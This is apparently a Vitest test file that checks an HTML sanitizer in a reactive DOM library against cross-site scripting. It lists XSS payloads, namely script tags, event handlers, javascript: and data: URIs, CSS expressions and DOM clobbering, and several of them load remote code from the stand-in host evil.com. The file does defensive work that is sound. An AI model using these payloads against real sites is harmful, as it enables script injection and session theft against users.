import { afterEach, describe, expect, it } from 'vitest';
import $ from '@/index';
import {
  isDangerousCssValue,
  type SanitizationPolicy,
  sanitizeCache,
  sanitizeHtml,
} from '@/utils/sanitize';

// ─── Security Test Kit ───────────────────────────────────────────────────────

/**
 * Security Testing Harness.
 * Verifies the sanitization layer via reactive state bindings.
 */
const TestKit = {
  async sanitize(html: string): Promise<string> {
    const value = $.atom(html);
    const $element = $('<div>').atomHtml(value);
    await $.nextTick();
    const result = $element.html();
    $element.atomUnbind();
    return result;
  },

  async sanitizeUpdate(initial: string, update: string): Promise<string> {
    const value = $.atom(initial);
    const $element = $('<div>').appendTo(document.body).atomHtml(value);
    await $.nextTick();
    value.value = update;
    await $.nextTick();
    const result = $element.html();
    $element.atomUnbind();
    $element.remove();
    return result;
  },

  async isUrlBlocked(attr: string, url: string): Promise<boolean> {
    const $element = $('<a>').atomAttr(attr, $.atom(url));
    await $.nextTick();
    const value = $element.attr(attr);
    $element.atomUnbind();
    return value === undefined || value === 'data-unsafe-protocol:';
  },

  async isCssBlocked(prop: string, value: string): Promise<boolean> {
    const $element = $('<div>').atomCss(prop, $.atom(value));
    await $.nextTick();
    const style = $element[0]?.style.getPropertyValue(prop);
    $element.atomUnbind();
    return style === '' || style === 'data-unsafe-css:';
  },
};

// ─── Attack Vectors ──────────────────────────────────────────────────────────

const ATTACK_VECTORS = {
  TAGS: [
    { payload: '<script>alert(1)</script>', target: 'script', type: 'standard script' },
    { payload: '<ScRiPt>alert(1)</ScRiPt>', target: 'script', type: 'case-swapped script' },
    {
      payload: '<script/src="http://evil.com/x.js"></script>',
      target: 'script',
      type: 'malformed opening tag',
    },
    {
      payload: '<iframe src="javascript:alert(1)"></iframe>',
      target: 'iframe',
      type: 'active iframe',
    },
    {
      payload: '<object data="javascript:alert(1)"></object>',
      target: 'object',
      type: 'malicious object',
    },
    {
      payload: '<embed src="javascript:alert(1)"></embed>',
      target: 'embed',
      type: 'malicious embed',
    },
    {
      payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
      target: 'meta',
      type: 'meta refresh redirect',
    },
    { payload: '<base href="javascript:alert(1)//">', target: 'base', type: 'base url hijack' },
    {
      payload: '<link rel="import" href="http://evil.com/xss.html">',
      target: 'link',
      type: 'html import',
    },
    {
      payload: '<style>@import "http://evil.com/xss.css";</style>',
      target: 'style',
      type: 'css import',
    },
    {
      payload: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
      target: 'noscript',
      type: 'noscript breakout',
    },
  ],
  EVENT_HANDLERS: [
    { payload: '<img src=x onerror=alert(1)>', handler: 'onerror' },
    { payload: '<div onmouseover="alert(1)">Test</div>', handler: 'onmouseover' },
    { payload: '<button onclick = "alert(1)">Click</button>', handler: 'onclick' },
    { payload: '<input onblur\n=\nalert(1)>', handler: 'onblur' },
    { payload: '<details ontoggle=alert(1)>', handler: 'ontoggle' },
    { payload: '<video><source onerror=alert(1)>', handler: 'onerror' },
    { payload: '<svg onload=alert(1)>', handler: 'onload' },
  ],
  PROTOCOLS: [
    { raw: 'javascript:alert(1)', desc: 'standard' },
    { raw: 'java\0script:alert(1)', desc: 'null-byte injection' },
    { raw: 'j a v a s c r i p t :alert(1)', desc: 'whitespace bypass' },
    { raw: 'javascript&colon;alert(1)', desc: 'html entity encoding' },
    { raw: 'vbscript:msgbox(1)', desc: 'legacy vbscript' },
    {
      raw: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      desc: 'malicious data-uri',
    },
  ],
};

// ─── Security Specification ──────────────────────────────────────────────────

describe('Atom-Effect: Security Specification', () => {
  afterEach(() => {
    document.body.innerHTML = '';
  });

  describe('Structural Isolation: Tag Neutralization', () => {
    it.each(ATTACK_VECTORS.TAGS)('should neutralize $type tags', async ({ payload, target }) => {
      const result = (await TestKit.sanitize(payload)).toLowerCase();
      expect(result).not.toContain(`<${target}`);
      expect(result).toContain('<span');
    });

    it('should handle deeply nested and recursive malicious tag structures', async () => {
      const payload = '<div><script>alert(1)</script><iframe><form></form></iframe></div>';
      const result = (await TestKit.sanitize(payload)).toLowerCase();
      expect(result).not.toMatch(/<(script|iframe|form)/);
      expect(result).toContain('alert(1)');
      expect(result).toContain('<span');
    });

    it('should sanitize content inside inert <template> elements recursively', async () => {
      const payload = '<template><div><template><script>1</script></template></div></template>';
      const result = await TestKit.sanitize(payload);
      expect(result).toContain('<template>');
      expect(result).not.toContain('<script');
      expect(result).toContain('<span');
    });
  });

  describe('Attribute Hardening: Event Handler Scrubbing', () => {
    it.each(ATTACK_VECTORS.EVENT_HANDLERS)('should strip $handler from elements', async ({
      payload,
      handler,
    }) => {
      const result = (await TestKit.sanitize(payload)).toLowerCase();
      expect(result).not.toContain(`${handler}=`);
      expect(result).toContain('data-unsafe-attr=');
    });

    it('should preserve original attribute order when multiple handlers are scrubbed', async () => {
      const payload = '<div onclick="a()" onmouseover="b()" onmouseenter="c()"></div>';
      const result = (await TestKit.sanitize(payload)).toLowerCase();
      expect(result).toContain('data-unsafe-attr="onclick,onmouseover,onmouseenter"');
    });

    it('should prevent DOM Clobbering via sensitive attribute names', async () => {
      const payloads = [
        '<form><input id="attributes"></form>',
        '<img id="tagName">',
        '<iframe name="nodeName"></iframe>',
      ];
      for (const p of payloads) {
        const result = (await TestKit.sanitize(p)).toLowerCase();
        expect(result).not.toContain('id="attributes"');
      }
    });
  });

  describe('URI Enforcement: Protocol Security', () => {
    it.each(ATTACK_VECTORS.PROTOCOLS)('should block $desc protocol bypasses', async ({ raw }) => {
      const result = (await TestKit.sanitize(`<a href="${raw}"></a>`)).toLowerCase();
      expect(result).not.toContain(raw.replace(/\s+/g, ''));
      expect(result).toContain('data-unsafe-protocol:');
    });

    it('should enforce security on all registered URL-sinks', async () => {
      const sinks = ['href', 'src', 'action', 'formaction', 'data', 'poster', 'xlink:href'];
      for (const sink of sinks) {
        const isBlocked = await TestKit.isUrlBlocked(sink, 'javascript:alert(1)');
        expect(isBlocked, `URI should be blocked for sink: ${sink}`).toBe(true);
      }
    });

    it('Regression: should block double-encoded HTML entity bypass', async () => {
      const payload = '<a href="&#x26;#x6A;avascript:1"></a>';
      const result = (await TestKit.sanitize(payload)).toLowerCase();
      expect(result).not.toContain('javascript');
    });

    it('should handle srcset attribute sanitization', async () => {
      // Safe srcset
      const safe = await TestKit.sanitize('<img srcset="safe.png 1x, safe2.png 2x">');
      expect(safe).toContain('srcset="safe.png 1x, safe2.png 2x"');

      // Dangerous srcset
      const dangerous = await TestKit.sanitize(
        '<img srcset="javascript:alert(1) 1x, safe.png 2x">'
      );
      expect(dangerous).toContain('srcset="data-unsafe-protocol: 1x, safe.png 2x"');

      // Empty and multiple spaces
      const spacey = await TestKit.sanitize('<img srcset="  safe.png   1x , , safe2.png 2x ">');
      expect(spacey).toContain('srcset="safe.png 1x,  , safe2.png 2x"');
    });
  });

  describe('Style Hardening: CSS-based Attack Prevention', () => {
    it('should strip dangerous CSS patterns while preserving safe declarations', async () => {
      const payload =
        '<div style="color: red; background: url(javascript:1); font-size: 12px;"></div>';
      const result = (await TestKit.sanitize(payload)).toLowerCase();
      expect(result).toContain('color: red');
      expect(result).toContain('font-size: 12px');
      expect(result).not.toContain('javascript');
    });

    it('should detect and block platform-specific dangerous CSS properties', async () => {
      const patterns = [
        ['background', 'url(javascript:alert(1))'],
        ['width', 'expression(alert(1))'],
        ['-moz-binding', 'url(https://evil.com/xbl)'],
      ] as const;
      for (const [prop, value] of patterns) {
        const isBlocked = await TestKit.isCssBlocked(prop, value);
        expect(isBlocked, `CSS property "${prop}" should block value: ${value}`).toBe(true);
      }
    });

    it('Regression: should prevent attribute injection via quote smuggling in style strings', async () => {
      const payload = '<div style="font-family: \'url("javascript:alert(1)")\'"></div>';
      const result = (await TestKit.sanitize(payload)).toLowerCase();
      expect(result).not.toContain('javascript');
    });

    it('should set style to data-unsafe-css when no safe styles remain', async () => {
      const result = await TestKit.sanitize(
        '<div style="background: url(javascript:alert(1))"></div>'
      );
      expect(result).toContain('style="data-unsafe-css:"');
    });

    it('should neutralize dangerous CSS inside style element', async () => {
      const payload = '<style>body { background: url(javascript:alert(1)); }</style>';
      const result = await TestKit.sanitize(payload);
      expect(result).toContain('<span>/* blocked */</span>');
    });

    it('should handle empty style element', async () => {
      const payload = '<style></style>';
      const result = await TestKit.sanitize(payload);
      expect(result).toContain('<span></span>');
    });

    it('should return false for isDangerousCssValue with invalid input', () => {
      expect(isDangerousCssValue(null)).toBe(false);
    });

    it('should resolve out of range numeric entities to empty string in CSS validation', () => {
      expect(isDangerousCssValue('&#x120000;color:red')).toBe(false);
    });
  });

  describe('Edge Cases & Regression Lab', () => {
    it('should correctly sanitize foreign XML-based contexts (SVG/MathML)', async () => {
      const svg = '<svg><a xlink:href="javascript:1"><rect fill="url(javascript:2)" /></a></svg>';
      const result = (await TestKit.sanitize(svg)).toLowerCase();
      expect(result).not.toContain('javascript');
    });

    it('Regression: should neutralize HTML tags hidden within text content', async () => {
      const payload = '<div>&lt;script&gt;alert(1)&lt;/script&gt;</div>';
      const result = (await TestKit.sanitize(payload)).toLowerCase();
      expect(result).not.toContain('&lt;script');
      expect(result).toContain('<span');
      expect(result).toMatch(/\[script\]/);
    });

    it('should maintain srcdoc integrity while neutralizing internal scripts', async () => {
      const payload = '<iframe srcdoc="&lt;b&gt;test&lt;/b&gt; &quot;quote&quot;"></iframe>';
      const result = await TestKit.sanitize(payload);
      expect(result).toContain('srcdoc="');
      expect(result).toContain('&lt;b&gt;test&lt;/b&gt;');
      expect(result).toContain('&quot;quote&quot;');
    });

    it('should recursively sanitize srcdoc content', async () => {
      const payload = '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>';
      const result = (await TestKit.sanitize(payload)).toLowerCase();
      expect(result).not.toContain('<script');
      expect(result).toContain('&lt;span');
    });

    it('should sanitize dynamic updates via atoms (Reactive Integration)', async () => {
      const result = await TestKit.sanitizeUpdate('<b>Safe</b>', '<img src=x onerror=alert(1)>');
      expect(result).not.toContain('onerror=');
      expect(result).toContain('data-unsafe-attr="onerror"');
    });

    it('should return empty string for falsy HTML inputs', () => {
      expect(sanitizeHtml(null)).toBe('');
      expect(sanitizeHtml(undefined)).toBe('');
      expect(sanitizeHtml('')).toBe('');
    });

    it('should sanitizeHtml with custom policy', () => {
      const customPolicy: SanitizationPolicy = {
        urlAttributes: ['src'],
        blacklistedTags: ['script'],
      };
      const html =
        '<iframe src="javascript:alert(1)"></iframe><a href="javascript:alert(2)"></a><script>alert(3)</script>';
      const result = sanitizeHtml(html, customPolicy);
      expect(result).toContain('<iframe src="data-unsafe-protocol:"></iframe>');
      expect(result).toContain('<a></a>');
      expect(result).toContain('<span>alert(3)</span>');
    });

    it('should handle SVG sensitive SMIL/animation attributes', async () => {
      const payload1 =
        '<animate attributeName="onmouseover" from="javascript:alert(1)" to="safe" />';
      const result1 = await TestKit.sanitize(payload1);
      expect(result1).not.toContain('attributeName');
      expect(result1).not.toContain('from');

      const payload2 = '<animate attributeName="href" from="onclick" to="javascript:alert(2)" />';
      const result2 = await TestKit.sanitize(payload2);
      expect(result2).not.toContain('attributeName');
      expect(result2).not.toContain('from');
      expect(result2).not.toContain('to');
    });
  });

  describe('sanitizeCache FIFO eviction strategy', () => {
    it('should evict the oldest cache entry and store new entries when size exceeds 1000', () => {
      // Clear cache first to have a clean state
      sanitizeCache.clear();

      // Generate 1000 cache entries
      for (let i = 0; i < 1000; i++) {
        sanitizeHtml(`<div>Template ${i}</div>`);
      }
      expect(sanitizeCache.size).toBe(1000);
      expect(sanitizeCache.has('<div>Template 0</div>')).toBe(true);

      // Add one more entry (1001st) to trigger eviction
      sanitizeHtml('<div>Template 1000</div>');
      expect(sanitizeCache.size).toBe(1000);
      // The oldest entry ('<div>Template 0</div>') should be evicted
      expect(sanitizeCache.has('<div>Template 0</div>')).toBe(false);
      // The new entry should be present
      expect(sanitizeCache.has('<div>Template 1000</div>')).toBe(true);
    });
  });
});
